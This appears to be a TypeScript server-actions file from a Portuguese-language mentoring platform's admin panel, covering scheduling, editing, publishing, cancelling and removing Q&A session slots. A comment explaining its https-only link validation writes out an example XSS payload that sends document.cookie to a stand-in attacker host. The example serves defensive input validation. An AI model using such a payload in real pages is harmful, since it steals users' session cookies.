"use server";

/**
 * Plantão de Dúvidas — Acelera Holding. Server Actions do ADMIN sobre os
 * SLOTS (criar, editar, publicar, trocar mentora, cancelar, remover, gravação).
 *
 * ⚠️ NÃO é o "agendamento de reunião com a equipe", removido em 10/08/2026
 * (commit b457005) e PROIBIDO de reconstruir.
 *
 * Toda ação abre com `ehAdmin()` — não-admin sai antes de qualquer viagem ao
 * banco (render-time gating não é fronteira de segurança; a proteção real é o
 * `public.gp_is_admin()` das policies RLS, mas a checagem aqui devolve erro
 * cedo).
 *
 * Recortado de `src/app/admin/plantao/actions.ts` (CD5) sem mudança de
 * comportamento. Aquele arquivo virou o agregador que reexporta daqui, para
 * os componentes de `src/components/admin/plantao-*` não mudarem de import.
 */

import { revalidatePath } from "next/cache";
import { createClient } from "@/lib/supabase/server";
import { ehAdmin } from "@/lib/auth";
import { enviarPlantaoCancelamento } from "@/lib/email-plantao";
import { logErro } from "@/lib/log";
import type {
  ResultadoAcao,
  ResultadoCancelamento,
  ResultadoCriacaoSlots,
} from "@/lib/plantao-tipos";


/** Teto da série semanal de `criarSlot`. Ver o comentário do clamp. */
const REPETIR_SEMANAS_MAX = 12;

/** Teto de e-mails de cancelamento por chamada. Ver `cancelarSlot`. */
const LIMITE_AVISOS_CANCELAMENTO = 500;

/** Motivo do cancelamento — mesmo teto do CHECK em `plantao_slots`. */
const MOTIVO_MAX = 300;

/**
 * Soma dias a uma data "YYYY-MM-DD" e devolve "YYYY-MM-DD".
 *
 * ⚠️ Aritmética em UTC de propósito. `new Date("2026-09-15")` seguido de
 * `setDate` no fuso local escorrega um dia em servidor a oeste de Greenwich —
 * e a Hostinger não é São Paulo. Aqui a data é um RÓTULO de calendário (a
 * coluna `data` é `date`); o INSTANTE quem deriva é `plantao_slots.inicio_em`,
 * no banco, com `at time zone 'America/Sao_Paulo'`.
 *
 * Devolve `null` quando a entrada não é um dia real: "2026-02-31" e
 * "2026-13-01" passam no regex e o `Date` os normaliza em silêncio para
 * outro dia — a série inteira sairia deslocada.
 */
function somarDias(iso: string, dias: number): string | null {
  const m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(iso);
  if (!m) return null;

  const ano = Number(m[1]);
  const mes = Number(m[2]);
  const dia = Number(m[3]);
  const base = new Date(Date.UTC(ano, mes - 1, dia));

  if (
    base.getUTCFullYear() !== ano ||
    base.getUTCMonth() !== mes - 1 ||
    base.getUTCDate() !== dia
  ) {
    return null;
  }

  base.setUTCDate(base.getUTCDate() + dias);
  return base.toISOString().slice(0, 10);
}

export interface CriarSlotInput {
  mentoraId: string;
  data: string; // "YYYY-MM-DD"
  horaInicio: string; // "HH:MM"
  duracaoMin: number;
  observacao?: string;
  /**
   * Repete o MESMO plantão (mentora/hora/duração/observação) nas N semanas
   * seguintes. 0 ou ausente = só a data informada, comportamento de sempre.
   */
  repetirSemanas?: number;
}

/**
 * Cria um plantão — ou uma SÉRIE semanal a partir dele.
 *
 * Tudo nasce **não publicado** (default da coluna), como antes: montar a
 * agenda e abrir a agenda continuam sendo dois atos.
 *
 * 🔑 Colisão de `unique (mentora_id, data, hora_inicio)` numa série NÃO é
 * erro: a equipe repete por cima de um dia já montado o tempo todo. A data
 * vira "pulada" e as outras semanas seguem. Abortar no primeiro 23505 faria
 * a operadora perder as 11 semanas seguintes por causa de uma.
 */
export async function criarSlot(
  input: CriarSlotInput,
): Promise<ResultadoCriacaoSlots> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  if (!somarDias(input.data, 0)) {
    return { ok: false, erro: "Data inválida." };
  }

  // Clamp no SERVIDOR. A Server Action é um endpoint HTTP e `repetirSemanas`
  // vira um laço de INSERTs: sem teto, um POST com 10000 criaria 10001
  // plantões. `Math.floor` mata fracionário; NaN/undefined/negativo caem em 0.
  const repetir = Math.min(
    Math.max(Math.floor(Number(input.repetirSemanas) || 0), 0),
    REPETIR_SEMANAS_MAX,
  );

  const supabase = await createClient();
  const observacao = input.observacao?.trim() || null;

  let criados = 0;
  const pulados: string[] = [];

  for (let i = 0; i <= repetir; i++) {
    const data = somarDias(input.data, i * 7);
    if (!data) return { ok: false, erro: "Data inválida.", criados, pulados };

    const { error } = await supabase.schema("gps").from("plantao_slots").insert({
      mentora_id: input.mentoraId,
      data,
      hora_inicio: input.horaInicio,
      duracao_min: input.duracaoMin,
      observacao,
    });

    if (!error) {
      criados++;
      continue;
    }

    // unique(mentora_id, data, hora_inicio)
    if (error.code === "23505") {
      pulados.push(data);
      continue;
    }

    logErro("plantao/criarSlot", error, { data, criados });
    return {
      ok: false,
      erro:
        criados > 0
          ? `Criei ${criados} plantão(ões) e parei em ${data}. Confira o calendário antes de tentar de novo.`
          : "Não foi possível criar o plantão.",
      criados,
      pulados,
    };
  }

  // Série inteira colidiu. `ok: true` com `criados: 0` leria como sucesso
  // silencioso — a equipe fecharia o diálogo achando que montou a agenda.
  if (criados === 0) {
    return {
      ok: false,
      erro:
        pulados.length === 1
          ? "Já existe um plantão desta mentora nesta data e horário."
          : `Todas as ${pulados.length} datas já têm plantão desta mentora neste horário.`,
      criados,
      pulados,
    };
  }

  revalidatePath("/admin/plantao");
  return { ok: true, criados, pulados };
}

/**
 * Valida a URL da sala antes de gravar.
 *
 * ⚠️ O link vira `<a href>` clicável para todos os inscritos. Sem esta trava,
 * um valor como `javascript:fetch('https://atacante/?c='+document.cookie)`
 * seria gravado e renderizado — React NÃO neutraliza `javascript:` em `href`.
 * A Server Action é um endpoint HTTP: o `<select>`/`<input>` da tela não é
 * fronteira, a validação precisa morar aqui.
 *
 * Só `https://` passa. Devolve a URL limpa, ou `null` para campo vazio, ou
 * `{ erro }` quando o valor é inválido.
 */
function validarZoomUrl(
  valor: string | undefined,
): { url: string | null } | { erro: string } {
  const limpo = valor?.trim() ?? "";
  if (!limpo) return { url: null };

  let parsed: URL;
  try {
    parsed = new URL(limpo);
  } catch {
    return { erro: "O link da sala precisa ser um endereço válido começando com https://" };
  }

  if (parsed.protocol !== "https:") {
    return { erro: "O link da sala precisa começar com https://" };
  }

  return { url: parsed.toString() };
}

export interface EditarSlotInput {
  slotId: string;
  mentoraId: string;
  data: string;
  horaInicio: string;
  duracaoMin: number;
  zoomUrl?: string;
  observacao?: string;
}

export async function editarSlot(input: EditarSlotInput): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const zoom = validarZoomUrl(input.zoomUrl);
  if ("erro" in zoom) return { ok: false, erro: zoom.erro };

  const supabase = await createClient();

  // Lê antes de escrever por duas razões que um UPDATE cego não cobre:
  //  1. slot CANCELADO não se edita (a tela esconde os botões, mas a Server
  //     Action é o endpoint real — `<button disabled>` não é fronteira);
  //  2. TROCA DE MENTORA precisa zerar `aviso_mentora_em`. Sem isso o slot
  //     segue marcado como "mentora já avisada" e a mentora NOVA nunca recebe
  //     o e-mail de véspera — `gps.plantao_aviso_mentora_pendente` filtra
  //     `aviso_mentora_em is null`. Era a lacuna L1 da Fase 8: a troca
  //     funcionava na tela e o aviso ia para o endereço errado, ou para
  //     ninguém.
  const { data: atual } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .select("id, mentora_id, cancelado_em")
    .eq("id", input.slotId)
    .maybeSingle();

  if (!atual) return { ok: false, erro: "Plantão não encontrado." };
  if (atual.cancelado_em) {
    return {
      ok: false,
      erro: "Este plantão foi cancelado e não pode mais ser editado.",
    };
  }

  const trocouMentora = atual.mentora_id !== input.mentoraId;

  const { error, data: linhas } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({
      mentora_id: input.mentoraId,
      data: input.data,
      hora_inicio: input.horaInicio,
      duracao_min: input.duracaoMin,
      zoom_url: zoom.url,
      observacao: input.observacao?.trim() || null,
      // Só quando a mentora MUDA. Zerar sempre reenviaria o aviso de véspera
      // a cada correção de observação ou de link da sala.
      ...(trocouMentora ? { aviso_mentora_em: null } : {}),
    })
    .eq("id", input.slotId)
    // Repete a condição no UPDATE: outro admin pode ter cancelado entre a
    // leitura acima e esta escrita (TOCTOU, pentest de 08/09). 0 linha = cancelado.
    .is("cancelado_em", null)
    .select("id");

  if (!error && (!linhas || linhas.length === 0)) {
    return { ok: false, erro: "Este plantão foi cancelado enquanto você editava." };
  }

  if (error) {
    if (error.code === "23505") {
      return { ok: false, erro: "Já existe um plantão desta mentora nesta data e horário." };
    }
    return { ok: false, erro: "Não foi possível salvar as alterações." };
  }

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Fluxo dedicado "trocar quem apresenta": só a mentora muda, sem passar pelo
 * formulário inteiro (lacuna L6 da Fase 8).
 *
 * 🔑 Zera `aviso_mentora_em` junto — é o mesmo par indissociável de
 * `editarSlot`, e a razão de esta ação existir em vez de a tela mandar um
 * `editarSlot` com os outros campos repetidos: reenviar data/hora/zoom só
 * para trocar o nome é convite a sobrescrever com estado velho de tela.
 *
 * Recusa slot cancelado (não há o que apresentar) e slot já iniciado (trocar
 * quem apresentou um plantão que já aconteceu reescreve o histórico — a
 * presença registrada é daquela mentora).
 */
export async function trocarMentoraSlot(
  slotId: string,
  mentoraId: string,
): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };
  if (!mentoraId) return { ok: false, erro: "Escolha a mentora do plantão." };

  const supabase = await createClient();

  const { data: slot } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .select("id, mentora_id, cancelado_em, inicio_em")
    .eq("id", slotId)
    .maybeSingle();

  if (!slot) return { ok: false, erro: "Plantão não encontrado." };
  if (slot.cancelado_em) {
    return { ok: false, erro: "Este plantão foi cancelado." };
  }
  // Comparação SEMPRE por `inicio_em` (timestamptz gerado no fuso de São
  // Paulo), nunca por `data` isolada — que mentiria o prazo das 21h à
  // meia-noite.
  if (new Date(slot.inicio_em as string) <= new Date()) {
    return {
      ok: false,
      erro: "Este plantão já começou ou já passou; não dá para trocar quem apresenta.",
    };
  }

  // No-op explícito: sem isto, "salvar" a mesma mentora zeraria
  // `aviso_mentora_em` e a véspera seria reenviada à mesma pessoa.
  if (slot.mentora_id === mentoraId) return { ok: true };

  const { data: mentora } = await supabase
    .schema("gps")
    .from("plantao_mentoras")
    .select("id, nome, ativa")
    .eq("id", mentoraId)
    .maybeSingle();

  if (!mentora) return { ok: false, erro: "Mentora não encontrada." };
  if (!mentora.ativa) {
    return {
      ok: false,
      erro: `${mentora.nome} está inativa. Reative na aba Mentoras antes de escalá-la.`,
    };
  }

  const { error, data: linhas } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({ mentora_id: mentoraId, aviso_mentora_em: null })
    .eq("id", slotId)
    .is("cancelado_em", null)
    .select("id");

  if (!error && (!linhas || linhas.length === 0)) {
    return { ok: false, erro: "Este plantão foi cancelado enquanto você trocava a mentora." };
  }

  if (error) {
    // unique(mentora_id, data, hora_inicio): a mentora nova já tem plantão
    // neste mesmo dia e horário — seriam duas salas dela ao mesmo tempo.
    if (error.code === "23505") {
      return {
        ok: false,
        erro: `${mentora.nome} já tem um plantão nesta data e horário.`,
      };
    }
    return { ok: false, erro: "Não foi possível trocar a mentora." };
  }

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Publica (ou despublica) um slot.
 *
 * 🔑 Publicar NÃO exige mais `zoom_url` (decisão do Marcio, 08/09/2026).
 * A trava original existia para o aluno nunca ver um plantão que ninguém
 * consegue acessar — intenção correta, premissa mudada: agora o objetivo é
 * **validar o agendamento primeiro** e definir a sala depois. Com a trava, o
 * admin não conseguia publicar nada e nenhum aluno conseguiria se inscrever.
 *
 * A intenção antiga continua honrada em outro lugar, onde de fato importa: o
 * botão que revela a sala só aparece dentro da janela e SÓ quando há link
 * (`MinhaInscricaoCard`). Sem link, o aluno vê o plantão e se inscreve; a
 * sala aparece quando a equipe cadastrar. O que ele nunca vê é um botão que
 * leva a lugar nenhum.
 *
 * 🔑 Publicar EXIGE, sim, e-mail da mentora (lacuna L2 da Fase 8).
 * `gps.plantao_aviso_mentora_pendente` filtra mentora sem e-mail de
 * propósito — publicar um plantão de mentora sem endereço abre inscrição
 * para uma sessão que a própria mentora nunca fica sabendo que tem. Falhava
 * em silêncio: nenhum erro, nenhum alerta, ninguém avisado. Diferente do
 * `zoom_url`, aqui não há segunda chance depois (a véspera passa uma vez).
 */
export async function publicarSlot(
  slotId: string,
  publicado: boolean,
): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();

  const { data: slot } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .select("id, cancelado_em, plantao_mentoras(nome, email)")
    .eq("id", slotId)
    .maybeSingle();

  if (!slot) return { ok: false, erro: "Plantão não encontrado." };
  if (slot.cancelado_em) {
    return {
      ok: false,
      erro: "Este plantão foi cancelado. Crie um novo horário no lugar dele.",
    };
  }

  const mentora = slot.plantao_mentoras as unknown as {
    nome: string;
    email: string | null;
  } | null;

  if (publicado && !mentora?.email?.trim()) {
    return {
      ok: false,
      erro: `A mentora ${mentora?.nome ?? "deste plantão"} não tem e-mail cadastrado; sem ele ela não recebe o aviso de véspera. Cadastre na aba Mentoras e publique de novo.`,
    };
  }

  const { error, data: linhas } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({ publicado })
    .eq("id", slotId)
    .is("cancelado_em", null)
    .select("id");

  if (error) return { ok: false, erro: "Não foi possível atualizar a publicação." };
  if (!linhas || linhas.length === 0) {
    return { ok: false, erro: "Este plantão foi cancelado e não pode mais ser publicado." };
  }

  revalidatePath("/admin/plantao");
  return { ok: true };
}

/**
 * Cancela um plantão PUBLICADO, com inscritos, avisando quem estava inscrito
 * (lacuna L3 da Fase 8).
 *
 * 🔑 Cancelar não é remover. `removerSlot` apaga a linha e o `on delete
 * cascade` leva presença e NPS junto — por isso ele é bloqueado por inscrito
 * ativo. Aqui o slot FICA, carimbado: é o que dá de onde escrever o e-mail e
 * o que mantém o histórico legível depois.
 *
 * Ordem, e por que ela é essa:
 *   1. lê e recusa (já cancelado / já iniciado) — nada de e-mail de
 *      cancelamento para um plantão que já aconteceu;
 *   2. despublica + carimba o slot. `publicado = false` é o que de fato tira
 *      o slot do calendário e faz `plantao_inscrever` recusar: nenhuma RPC
 *      pública lê `cancelado_em`, e é deliberado (uma regra só para o mesmo
 *      fato);
 *   3. encerra as inscrições ativas;
 *   4. só ENTÃO manda e-mail. Envio é I/O de terceiro: se a Resend estiver
 *      fora, o cancelamento já está gravado e o mundo já é consistente. O
 *      contrário — e-mail primeiro — avisaria gente de um cancelamento que
 *      pode não acontecer.
 *
 * Falha de e-mail NÃO desfaz nada: conta em `falhas` e vai para o log com
 * contexto. `avisados + falhas === inscritos`, sempre — é o que permite a
 * tela dizer a verdade em vez de sugerir que todos foram avisados.
 */
export async function cancelarSlot(
  slotId: string,
  motivo?: string,
): Promise<ResultadoCancelamento> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  // Valida aqui em vez de deixar o CHECK do banco estourar: um 23514 volta
  // como "Não foi possível cancelar", que não diz o que corrigir.
  const motivoLimpo = motivo?.trim() || null;
  if (motivoLimpo && motivoLimpo.length > MOTIVO_MAX) {
    return {
      ok: false,
      erro: `O motivo precisa ter no máximo ${MOTIVO_MAX} caracteres.`,
    };
  }

  const supabase = await createClient();

  // ── 1. Lê o slot e os inscritos ativos ────────────────────────────────
  const { data: slot } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .select("id, data, hora_inicio, cancelado_em, inicio_em, plantao_mentoras(nome)")
    .eq("id", slotId)
    .maybeSingle();

  if (!slot) return { ok: false, erro: "Plantão não encontrado." };

  // `count: "exact"` junto do recorte: `inscritos` passa a ser o total REAL,
  // não o tamanho da página. Sem isso, um slot com mais inscritos do que o
  // teto reportaria "todos avisados" tendo avisado só os primeiros 500.
  const {
    data: inscricoes,
    count: totalInscritos,
    error: erroLeitura,
  } = await supabase
    .schema("gps")
    .from("plantao_inscricoes")
    .select("id, nome_informado, plantao_alunos(nome, email)", { count: "exact" })
    .eq("slot_id", slotId)
    .is("cancelado_em", null)
    .order("inscrito_em")
    .limit(LIMITE_AVISOS_CANCELAMENTO);

  if (erroLeitura) {
    logErro("plantao/cancelarSlot", erroLeitura, { slotId, passo: "ler inscritos" });
    return { ok: false, erro: "Não foi possível ler os inscritos deste plantão." };
  }

  const lista = inscricoes ?? [];
  const inscritos = totalInscritos ?? lista.length;

  // Retomada de uma execução interrompida: já carimbado MAS ainda com
  // inscrição ativa significa que o passo 3 não chegou a rodar. Deixar isso
  // sem saída obrigaria SQL na mão — exatamente o que a Fase 8 veio tirar.
  const jaCancelado = Boolean(slot.cancelado_em);
  if (jaCancelado && inscritos === 0) {
    return { ok: false, erro: "Este plantão já foi cancelado." };
  }

  // Guarda de prazo só no cancelamento NOVO: a retomada precisa terminar a
  // limpeza mesmo depois de o horário passar.
  if (!jaCancelado && new Date(slot.inicio_em as string) <= new Date()) {
    return {
      ok: false,
      erro: "Este plantão já começou ou já passou; não dá para cancelar.",
    };
  }

  // ── 2. Despublica + carimba ───────────────────────────────────────────
  if (!jaCancelado) {
    // `.is("cancelado_em", null)` + `.select()` fecham a corrida de dois
    // admins clicando junto: o segundo update casa 0 linhas e não reenvia
    // e-mail de cancelamento para as mesmas pessoas.
    const { data: carimbado, error: erroSlot } = await supabase
      .schema("gps")
      .from("plantao_slots")
      .update({
        cancelado_em: new Date().toISOString(),
        cancelado_motivo: motivoLimpo,
        publicado: false,
      })
      .eq("id", slotId)
      .is("cancelado_em", null)
      .select("id");

    if (erroSlot) {
      logErro("plantao/cancelarSlot", erroSlot, { slotId, passo: "carimbar slot" });
      return { ok: false, erro: "Não foi possível cancelar o plantão." };
    }
    if (!carimbado?.length) {
      return { ok: false, erro: "Este plantão já foi cancelado." };
    }
  }

  // ── 3. Encerra as inscrições ativas ───────────────────────────────────
  const { error: erroInscricoes } = await supabase
    .schema("gps")
    .from("plantao_inscricoes")
    .update({ cancelado_em: new Date().toISOString() })
    .eq("slot_id", slotId)
    .is("cancelado_em", null);

  if (erroInscricoes) {
    // O slot JÁ está cancelado e despublicado — ninguém entra e ninguém se
    // inscreve. O que ficou pendente é a baixa das inscrições, e a pessoa
    // seguiria "com plantão marcado" sem poder marcar outro. Dizer a verdade
    // e mandar repetir: a retomada acima existe exatamente para este caso.
    logErro("plantao/cancelarSlot", erroInscricoes, {
      slotId,
      passo: "encerrar inscricoes",
    });
    return {
      ok: false,
      erro:
        "O plantão foi cancelado, mas as inscrições não foram encerradas e ninguém foi avisado. Clique em cancelar de novo.",
      inscritos,
      avisados: 0,
      falhas: inscritos,
    };
  }

  // ── 4. Avisa cada inscrito ────────────────────────────────────────────
  const mentoraNome =
    (slot.plantao_mentoras as unknown as { nome: string } | null)?.nome ?? "a mentora";

  let avisados = 0;
  // Quem ficou fora da página já entra como falha: `avisados + falhas` tem de
  // fechar com `inscritos`, senão a tela mente por omissão.
  let falhas = Math.max(inscritos - lista.length, 0);

  // Sequencial de propósito: dezenas de e-mails contra o limite de taxa da
  // Resend. Disparar tudo em paralelo trocaria "demora 3s" por "metade
  // rejeitada por rate limit".
  for (const linha of lista) {
    const aluno = linha.plantao_alunos as unknown as {
      nome: string;
      email: string;
    } | null;
    const para = aluno?.email?.trim();

    if (!para) {
      falhas++;
      // Sem PII: o id da inscrição basta para achar a pessoa no banco.
      logErro("plantao/cancelarSlot", "inscricao sem e-mail", {
        slotId,
        inscricaoId: linha.id,
      });
      continue;
    }

    const envio = await enviarPlantaoCancelamento({
      para,
      nome: (linha.nome_informado as string | null) ?? aluno?.nome ?? null,
      data: slot.data as string,
      horaInicio: slot.hora_inicio as string,
      mentoraNome,
      motivo: motivoLimpo,
    }).catch(() => ({ ok: false as const, erro: "exceção no envio" }));

    if (envio.ok) {
      avisados++;
    } else {
      falhas++;
      logErro("plantao/cancelarSlot", envio.erro ?? "sem detalhe", {
        slotId,
        inscricaoId: linha.id,
        passo: "avisar inscrito",
      });
    }
  }

  // ── 5. Auditoria ──────────────────────────────────────────────────────
  // `plantao_eventos.acao` é texto livre (sem CHECK) e a retenção de 90 dias
  // do job já cobre esta linha. `aluno_plantao_id` fica nulo: cancelar é ato
  // da EQUIPE sobre o slot, não de um aluno — a coluna aceita nulo desde a
  // estrutura original (tentativa de login sem aluno para referenciar).
  // Falhar aqui não desfaz o cancelamento: perder a linha de auditoria é
  // ruim, deixar o plantão meio cancelado é pior.
  const { error: erroEvento } = await supabase
    .schema("gps")
    .from("plantao_eventos")
    .insert({ acao: "plantao_slot_cancelado", slot_id: slotId });

  if (erroEvento) {
    logErro("plantao/cancelarSlot", erroEvento, { slotId, passo: "auditoria" });
  }

  revalidatePath("/admin/plantao");
  return { ok: true, avisados, inscritos, falhas };
}
/**
 * Remove um slot. `on delete cascade` em `plantao_inscricoes` apaga as
 * inscrições junto — por isso só permite remover slots ainda sem inscrito
 * ativo, para não apagar histórico de presença/NPS silenciosamente.
 *
 * ✅ Slot CANCELADO passa por aqui sem mudança nenhuma no código: cancelar
 * carimba `cancelado_em` em todas as inscrições, então a contagem abaixo
 * (que já filtra `cancelado_em is null`) dá zero. Conferido na Fase 8 — a
 * regra pedida ("permitir remover slot cancelado") já era consequência do
 * critério certo. O que se apaga aí é histórico de um plantão que não
 * aconteceu: presença e NPS de inscrição cancelada são nulos por definição.
 */
export async function removerSlot(slotId: string): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  const supabase = await createClient();

  const { count } = await supabase
    .schema("gps")
    .from("plantao_inscricoes")
    .select("id", { count: "exact", head: true })
    .eq("slot_id", slotId)
    .is("cancelado_em", null);

  if (count && count > 0) {
    return {
      ok: false,
      erro: "Este plantão tem inscritos ativos. Cancele as inscrições antes de remover.",
    };
  }

  const { error } = await supabase.schema("gps").from("plantao_slots").delete().eq("id", slotId);
  if (error) return { ok: false, erro: "Não foi possível remover o plantão." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}

export async function salvarGravacao(
  slotId: string,
  gravacaoUrl: string,
): Promise<ResultadoAcao> {
  if (!(await ehAdmin())) return { ok: false, erro: "Sem permissão." };

  // Mesma trava do `zoom_url`: a gravação vira `<a href>` no painel, e React
  // não neutraliza `javascript:`. Só admin escreve e só admin vê, mas manter
  // dois critérios diferentes para o mesmo tipo de campo é como um deles
  // acaba esquecido depois.
  const gravacao = validarZoomUrl(gravacaoUrl);
  if ("erro" in gravacao) {
    return { ok: false, erro: "O link da gravação precisa começar com https://" };
  }

  const supabase = await createClient();
  const { error } = await supabase
    .schema("gps")
    .from("plantao_slots")
    .update({ gravacao_url: gravacao.url })
    .eq("id", slotId);

  if (error) return { ok: false, erro: "Não foi possível salvar a gravação." };

  revalidatePath("/admin/plantao");
  return { ok: true };
}
